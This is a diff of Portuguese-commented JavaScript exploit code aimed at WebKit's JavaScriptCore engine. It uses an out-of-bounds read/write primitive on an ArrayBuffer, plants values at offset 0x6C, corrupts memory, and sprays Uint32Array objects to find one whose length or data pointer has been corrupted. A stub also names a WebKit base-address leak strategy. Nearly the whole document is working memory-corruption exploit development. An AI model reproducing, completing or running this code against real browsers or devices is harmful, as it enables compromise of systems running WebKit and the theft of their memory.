@@ -23,13 +23,14 @@ const OOB_AB_SNOOP_WINDOW_SIZE = 0x100;
 
 const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
     0xFEFEFEFE, 0xCDCDCDCD, 0x12345678, 0x00000000, 0xABABABAB,
-    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2
+    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2)
 ];
 
 // !!!!! IMPORTANTE: SUBSTITUA ESTE VALOR PELO STRUCTUREID REAL DE UM Uint32Array NA SUA PLATAFORMA !!!!!
-const EXPECTED_UINT32ARRAY_STRUCTURE_ID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID
-    ? ( (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID & 0xFFFF00FF) | 0x00002300 )
-    : 0x01082302;
+const baseStructIdForAB = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
+const EXPECTED_UINT32ARRAY_STRUCTURE_ID = baseStructIdForAB
+    ? ( (baseStructIdForAB & 0xFFFF00FF) | 0x00002300 ) // Suposição: TypedArray View ID. PODE ESTAR INCORRETO.
+    : 0x01082302; // Chute MUITO genérico se ArrayBuffer_STRUCTURE_ID não estiver definido. VOCÊ PRECISA VALIDAR!
 
 
 // ============================================================
@@ -104,8 +105,8 @@ export async function executeRetypeOOB_AB_Test() {
     logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (Corrigido) ---`, "test", FNAME_TEST_RUNNER);
     let overall_summary = [];
 
-    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
-        logS3("Offsets Críticos Ausentes para Teste 0x6C", "critical", FNAME_TEST_RUNNER); return;
+    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs || !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) {
+        logS3("Offsets Críticos Ausentes para Teste 0x6C (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID)", "critical", FNAME_TEST_RUNNER); return;
     }
 
     for (const initial_low_dword_planted of LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C) {
@@ -118,6 +119,7 @@ export async function executeRetypeOOB_AB_Test() {
         try {
             await triggerOOB_primitive();
             if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { throw new Error("OOB Init ou primitivas R/W falharam para Teste 0x6C"); }
+            
             const fill_limit = Math.min(OOB_AB_SNOOP_WINDOW_SIZE, oob_array_buffer_real.byteLength);
             for (let offset = 0; offset < fill_limit; offset += 4) {
                 if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) || (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8)) continue;
@@ -127,10 +129,17 @@ export async function executeRetypeOOB_AB_Test() {
             if (TARGET_WRITE_OFFSET_0x6C + 4 < oob_array_buffer_real.byteLength && !(TARGET_WRITE_OFFSET_0x6C + 4 >= CORRUPTION_OFFSET_TRIGGER && TARGET_WRITE_OFFSET_0x6C + 4 < CORRUPTION_OFFSET_TRIGGER + 8)) {
                 oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4);
             }
-            global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data_payload": "GetterStressData" };
+            // const initial_qword_val = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8); // Já logado abaixo se necessário
+            // logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD inicial) = ${initial_qword_val.toString(true)}.`, "info", FNAME_TEST_RUNNER);
+            
+            global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data_payload": "GetterStressData"};
             oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+            // logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);
+
             const checkpoint_obj = new CheckpointFor0x6CAnalysis(1); checkpoint_obj.prop_for_stringify_target = global_object_for_internal_stringify;
+            // logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
             JSON.stringify(checkpoint_obj);
+
             if (getter_called_flag && current_test_results_for_subtest.value_after_trigger_object) {
                 const final_qword_val_obj = current_test_results_for_subtest.value_after_trigger_object;
                 if (final_qword_val_obj.high() === 0xFFFFFFFF && final_qword_val_obj.low() === initial_low_dword_planted) { current_test_results_for_subtest.success = true; current_test_results_for_subtest.message = `SUCESSO! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (preservado).`;
@@ -141,21 +150,27 @@ export async function executeRetypeOOB_AB_Test() {
         } catch (mainError_runner_subtest) { current_test_results_for_subtest.message = `Erro CRÍTICO no sub-teste 0x6C: ${mainError_runner_subtest.message}`; current_test_results_for_subtest.error = String(mainError_runner_subtest) + (mainError_runner_subtest.stack ? `\nStack: ${mainError_runner_subtest.stack}`: ''); logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER); console.error(mainError_runner_subtest);
         } finally {
             current_test_results_for_subtest.getter_actually_called = getter_called_flag;
-            logS3(`FIM DO SUB-TESTE 0x6C com padrão ${toHex(initial_low_dword_planted)}. Msg: ${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "good" : "warn", FNAME_TEST_RUNNER);
+            // Log resumido no finally para reduzir verbosidade se tudo correr bem.
+            if (!current_test_results_for_subtest.success || current_test_results_for_subtest.error) {
+                logS3(`FIM DO SUB-TESTE 0x6C (padrão ${toHex(initial_low_dword_planted)}): Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "good" : "error", FNAME_TEST_RUNNER);
+            }
             overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest))); clearOOBEnvironment(); global_object_for_internal_stringify = null;
-            if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length - 1]) await PAUSE_S3(100);
+            if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length - 1]) await PAUSE_S3(50); // Reduzida pausa
         }
     }
     logS3("==== SUMÁRIO GERAL DO TESTE DE ANÁLISE DA ESCRITA EM 0x6C (Corrigido) ====", "test", FNAME_TEST_RUNNER);
     overall_summary.forEach(res_item => {
-        logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
-        logS3(`  Getter Chamado: ${res_item.getter_actually_called}`, "info", FNAME_TEST_RUNNER);
-        logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
-        logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
-        if (res_item.value_after_trigger_hex) logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
-        if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
-        if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
-        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
+        // Logar apenas se houver erro ou se o getter não foi chamado, ou se não houve sucesso.
+        if (res_item.error || !res_item.getter_actually_called || !res_item.success) {
+            logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
+            logS3(`  Getter Chamado: ${res_item.getter_actually_called}`, "info", FNAME_TEST_RUNNER);
+            logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
+            logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
+            if (res_item.value_after_trigger_hex) logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
+            if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
+            if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
+            logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
+        }
     });
     logS3(`--- Teste de Análise da Escrita em 0x6C (Corrigido) Concluído ---`, "test", FNAME_TEST_RUNNER);
 }
@@ -168,25 +183,26 @@ export async function sprayAndInvestigateObjectExposure() {
     const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;
     const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58;
     const SCAN_WINDOW_HALF_SIZE = 0x20;
-    const SCAN_STEP = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET || 0x8;
+    const SCAN_STEP = (JSC_OFFSETS.JSCell && JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) ? JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET : 0x8;
 
     logS3(`   AVISO: Usando StructureID esperado para Uint32Array: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}. SUBSTITUA PELO VALOR CORRETO se este não funcionar!`, "warn", FNAME_SPRAY_INVESTIGATE);
-    const fallbackExpectedID = 0x01082302;
-    const baseKnownStructID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
-    const comparisonID = baseKnownStructID
-        ? ((baseKnownStructID & 0xFFFF00FF) | 0x00002300)
-        : fallbackExpectedID;
+    
+    const fallbackExpectedIDForLog = 0x01082302; 
+    const knownBaseStructID = (JSC_OFFSETS.ArrayBuffer && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs) ? JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID : undefined;
+    const comparisonIDForLog = typeof knownBaseStructID === 'number'
+        ? ((knownBaseStructID & 0xFFFF00FF) | 0x00002300)
+        : fallbackExpectedIDForLog;
 
-    if (EXPECTED_UINT32ARRAY_STRUCTURE_ID === comparisonID && EXPECTED_UINT32ARRAY_STRUCTURE_ID === fallbackExpectedID) {
-        logS3(`   O StructureID de Uint32Array (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}) acima é um CHUTE. Sem o ID correto, a fase de pré-scan pode não ser útil.`, "critical", FNAME_SPRAY_INVESTIGATE);
+    if (EXPECTED_UINT32ARRAY_STRUCTURE_ID === comparisonIDForLog && EXPECTED_UINT32ARRAY_STRUCTURE_ID === fallbackExpectedIDForLog) {
+         logS3(`   O StructureID de Uint32Array (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}) acima é um CHUTE. Sem o ID correto, a fase de pré-scan pode não ser útil.`, "critical", FNAME_SPRAY_INVESTIGATE);
     }
 
     let sprayedVictimObjects = [];
     let preCorruptionCandidates = {};
 
-    try {
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
+    try { // Linha 195 (aproximadamente, onde o erro foi reportado)
+        await triggerOOB_primitive(); // Linha 196
+        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { // Linha 197 <<<< PONTO DO ERRO ANTERIOR
             throw new Error("OOB Init ou primitivas R/W falharam.");
         }
         logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
@@ -202,7 +218,7 @@ export async function sprayAndInvestigateObjectExposure() {
 
         logS3("FASE 2: Escaneando por Uint32Arrays candidatos ANTES da corrupção...", "info", FNAME_SPRAY_INVESTIGATE);
         const scanStart = Math.max(0, FOCUSED_VICTIM_ABVIEW_START_OFFSET - SCAN_WINDOW_HALF_SIZE);
-        const scanEnd = Math.min(oob_array_buffer_real.byteLength - 0x20, FOCUSED_VICTIM_ABVIEW_START_OFFSET + SCAN_WINDOW_HALF_SIZE);
+        const scanEnd = Math.min(oob_array_buffer_real.byteLength - 0x30, FOCUSED_VICTIM_ABVIEW_START_OFFSET + SCAN_WINDOW_HALF_SIZE); // Ajuste para garantir leitura de todos os campos
 
         for (let offset = scanStart; offset <= scanEnd; offset += SCAN_STEP) {
             try {
@@ -211,22 +227,22 @@ export async function sprayAndInvestigateObjectExposure() {
                     logS3(`  CANDIDATO Uint32Array encontrado em ${toHex(offset)} com StructureID ${toHex(sid)}`, "good", FNAME_SPRAY_INVESTIGATE);
                     const vec_before = oob_read_absolute(offset + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
                     const len_before = oob_read_absolute(offset + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 4);
-                    preCorruptionCandidates[offset] = { sid_before: sid, vec_before: vec_before.toString(true), len_before: len_before };
-                    logS3(`    Antes da corrupção: m_vector=${vec_before.toString(true)}, m_length=${toHex(len_before)} (${len_before})`, "info", FNAME_SPRAY_INVESTIGATE);
-                } else if (sid !== OOB_SCAN_FILL_PATTERN && sid !== 0 && sid !== 0xFFFFFFFF && (sid & 0xFFFF0000) !== (OOB_SCAN_FILL_PATTERN & 0xFFFF0000) ) {
-                    logS3(`  Encontrado StructureID ${toHex(sid)} em ${toHex(offset)} (não é o esperado nem padrão de preenchimento).`, "info", FNAME_SPRAY_INVESTIGATE);
+                    preCorruptionCandidates[offset.toString()] = { sid_before: sid, vec_before: (isAdvancedInt64Object(vec_before) ? vec_before.toString(true) : toHex(vec_before)), len_before: len_before };
+                    logS3(`    Antes da corrupção: m_vector=${isAdvancedInt64Object(vec_before) ? vec_before.toString(true) : toHex(vec_before)}, m_length=${toHex(len_before)} (${len_before})`, "info", FNAME_SPRAY_INVESTIGATE);
+                } else if (sid !== OOB_SCAN_FILL_PATTERN && sid !== 0 && sid !== 0xFFFFFFFF && (sid & 0xFFFF0000) !== (OOB_SCAN_FILL_PATTERN & 0xFFFF0000)) {
+                    logS3(`  Encontrado StructureID ${toHex(sid)} em ${toHex(offset)} (não é o esperado Uint32Array nem padrão de preenchimento).`, "info", FNAME_SPRAY_INVESTIGATE);
                 }
             } catch (e) {/* ignore */}
         }
         if (Object.keys(preCorruptionCandidates).length === 0) {
             logS3("  Nenhum candidato Uint32Array encontrado com o StructureID esperado na faixa de varredura pré-corrupção.", "warn", FNAME_SPRAY_INVESTIGATE);
             logS3(`  Adicionando ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} à lista de candidatos para verificação pós-corrupção.`, "info", FNAME_SPRAY_INVESTIGATE);
-            preCorruptionCandidates[FOCUSED_VICTIM_ABVIEW_START_OFFSET.toString()] = {note: "Offset focado, sem verificação prévia de SID."}; // Chave do objeto deve ser string
+            preCorruptionCandidates[FOCUSED_VICTIM_ABVIEW_START_OFFSET.toString()] = { note: "Offset focado, sem verificação prévia de SID." };
         }
 
         for (let i = 0; i < Math.min(0x100, oob_array_buffer_real.byteLength); i += 4) {
             if (i === TARGET_WRITE_OFFSET_0x6C || i === (TARGET_WRITE_OFFSET_0x6C + 4)) continue;
-            try { oob_write_absolute(i, OOB_SCAN_FILL_PATTERN, 4); } catch(e) {}
+            try { oob_write_absolute(i, OOB_SCAN_FILL_PATTERN, 4); } catch (e) {}
         }
         const initial_low_dword_at_0x6C = 0x12345678;
         oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_at_0x6C, 4);
@@ -237,55 +253,51 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         const value_at_0x6C_after_corruption = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
         logS3(`Valor em ${toHex(TARGET_WRITE_OFFSET_0x6C)} APÓS CORRUPÇÃO: ${value_at_0x6C_after_corruption.toString(true)}`, "leak", FNAME_SPRAY_INVESTIGATE);
-        
-        // Linha 257 está aproximadamente aqui ou logo abaixo, dentro do loop
-        let logMsgQualifierText;
-        const numPreCandidates = Object.keys(preCorruptionCandidates).length;
-        if (numPreCandidates > 0) {
-            const firstCandidateKey = Object.keys(preCorruptionCandidates)[0];
-            const isFocusedCandidateOnly = numPreCandidates === 1 && preCorruptionCandidates[firstCandidateKey] && typeof preCorruptionCandidates[firstCandidateKey].note !== 'undefined';
-            logMsgQualifierText = !isFocusedCandidateOnly ? "offsets candidatos" : "offset focado";
-        } else {
-            logMsgQualifierText = "offset focado (nenhum candidato prévio)";
-        }
-        logS3(`FASE 4: Re-investigando ${logMsgQualifierText} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE);
+
+        let logMsgQualifierTextScanPhase;
+        const numCand = Object.keys(preCorruptionCandidates).length;
+        const firstCandKey = numCand > 0 ? Object.keys(preCorruptionCandidates)[0] : "";
+        const isOnlyFocused = numCand === 1 && preCorruptionCandidates[firstCandKey] && preCorruptionCandidates[firstCandKey].note;
+        logMsgQualifierTextScanPhase = isOnlyFocused ? "offset focado" : "offsets candidatos";
+        if (numCand === 0) logMsgQualifierTextScanPhase = "offset focado (nenhum candidato prévio)";
+
+        logS3(`FASE 4: Re-investigando ${logMsgQualifierTextScanPhase} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE);
 
         for (const victim_base_str in preCorruptionCandidates) {
             const victim_base = parseInt(victim_base_str);
-            logS3(`  Verificando offset ${toHex(victim_base)} (candidato pré-corrupção / focado)...`, "subtest", FNAME_SPRAY_INVESTIGATE);
+            logS3(`  Verificando offset ${toHex(victim_base)}...`, "subtest", FNAME_SPRAY_INVESTIGATE);
             const candidate_info = preCorruptionCandidates[victim_base_str];
-            if(candidate_info && candidate_info.note) logS3(`    Nota: ${candidate_info.note}`, "info", FNAME_SPRAY_INVESTIGATE);
+            if (candidate_info && candidate_info.note) logS3(`    Nota: ${candidate_info.note}`, "info", FNAME_SPRAY_INVESTIGATE);
 
-            let struct_id, struct_ptr, abv_vector, abv_length, abv_mode;
+            let struct_id_after, struct_ptr_after, abv_vector_after, abv_length_after, abv_mode_after;
             const sid_offset = victim_base + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
             const sptr_offset = victim_base + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
             const vec_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
             const len_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
             const mode_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
 
-            try { struct_id = oob_read_absolute(sid_offset, 4); } catch(e) {}
-            try { struct_ptr = oob_read_absolute(sptr_offset, 8); } catch(e) {}
-            try { abv_vector = oob_read_absolute(vec_offset, 8); } catch(e) {}
-            try { abv_length = oob_read_absolute(len_offset, 4); } catch(e) {}
-            try { abv_mode = oob_read_absolute(mode_offset, 4); } catch(e) {}
+            try { struct_id_after = oob_read_absolute(sid_offset, 4); } catch(e) {}
+            try { struct_ptr_after = oob_read_absolute(sptr_offset, 8); } catch(e) {}
+            try { abv_vector_after = oob_read_absolute(vec_offset, 8); } catch(e) {}
+            try { abv_length_after = oob_read_absolute(len_offset, 4); } catch(e) {}
+            try { abv_mode_after = oob_read_absolute(mode_offset, 4); } catch(e) {}
 
-            const sid_before_str = candidate_info && typeof candidate_info.sid_before !== 'undefined' ? toHex(candidate_info.sid_before) : "N/A";
-            const vec_before_str = candidate_info && typeof candidate_info.vec_before !== 'undefined' ? candidate_info.vec_before : "N/A";
-            const len_before_val = candidate_info && typeof candidate_info.len_before !== 'undefined' ? candidate_info.len_before : undefined;
+            const sid_before_str = (candidate_info && typeof candidate_info.sid_before !== 'undefined') ? toHex(candidate_info.sid_before) : "N/A";
+            const vec_before_str = (candidate_info && typeof candidate_info.vec_before !== 'undefined') ? candidate_info.vec_before : "N/A"; // Já era string
+            const len_before_val = (candidate_info && typeof candidate_info.len_before !== 'undefined') ? candidate_info.len_before : undefined;
             const len_before_str = typeof len_before_val !== 'undefined' ? `${toHex(len_before_val)} (${len_before_val})` : "N/A";
 
-
             logS3(`    Resultados para offset base ${toHex(victim_base)} APÓS corrupção:`, "info", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      StructureID (@${toHex(sid_offset)}): ${toHex(struct_id)} (Antes SID: ${sid_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_vector    (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector) ? abv_vector.toString(true) : toHex(abv_vector)} (Antes Vec: ${vec_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_length    (@${toHex(len_offset)}): ${toHex(abv_length)} (Decimal: ${abv_length}, Antes Len: ${len_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_mode      (@${toHex(mode_offset)}): ${toHex(abv_mode)}`, "leak", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      StructureID (@${toHex(sid_offset)}): ${toHex(struct_id_after)} (Antes SID: ${sid_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      m_vector    (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : toHex(abv_vector_after)} (Antes Vec: ${vec_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      m_length    (@${toHex(len_offset)}): ${toHex(abv_length_after)} (Decimal: ${abv_length_after}, Antes Len: ${len_before_str})`, "leak", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      m_mode      (@${toHex(mode_offset)}): ${toHex(abv_mode_after)}`, "leak", FNAME_SPRAY_INVESTIGATE);
 
-            if (typeof abv_length === 'number' && 
-                (abv_length === 0xFFFFFFFF || (typeof len_before_val === 'number' && abv_length > len_before_val && abv_length > 1000 ))) {
+            if (typeof abv_length_after === 'number' &&
+                (abv_length_after === 0xFFFFFFFF || (typeof len_before_val === 'number' && abv_length_after > len_before_val && abv_length_after > 1000))) {
                 logS3(`    !!!! ACHADO PROMISSOR em ${toHex(victim_base)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-                logS3(`      m_length em ${toHex(len_offset)} parece corrompido para um valor grande: ${toHex(abv_length)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-                logS3(`      m_vector atual: ${isAdvancedInt64Object(abv_vector) ? abv_vector.toString(true) : toHex(abv_vector)}`, "vuln", FNAME_SPRAY_INVESTIGATE);
+                logS3(`      m_length em ${toHex(len_offset)} parece corrompido para um valor grande: ${toHex(abv_length_after)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
+                logS3(`      m_vector atual: ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : toHex(abv_vector_after)}`, "vuln", FNAME_SPRAY_INVESTIGATE);
                 document.title = `Spray: ACHADO m_length @${toHex(victim_base)}`;
             }
         }
@@ -303,7 +315,6 @@ export async function sprayAndInvestigateObjectExposure() {
 }
 
 export async function attemptWebKitBaseLeakStrategy_OLD() {
-    const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy_v3_OLD";
-    logS3(`--- Iniciando Estratégia de Vazamento de Base do WebKit (v3 - via JSWithScope - ARQUIVADA) ---`, "test", FNAME_LEAK_RUNNER);
-    logS3("   (Função attemptWebKitBaseLeakStrategy_OLD não executada ativamente neste fluxo)", "info", FNAME_LEAK_RUNNER);
+    // ... (Corpo da função da v2/v3 anterior, pode ser copiado da resposta anterior se necessário)
+    logS3("   (Função attemptWebKitBaseLeakStrategy_OLD não executada ativamente neste fluxo)", "info", "attemptWebKitBaseLeakStrategy_OLD");
 }
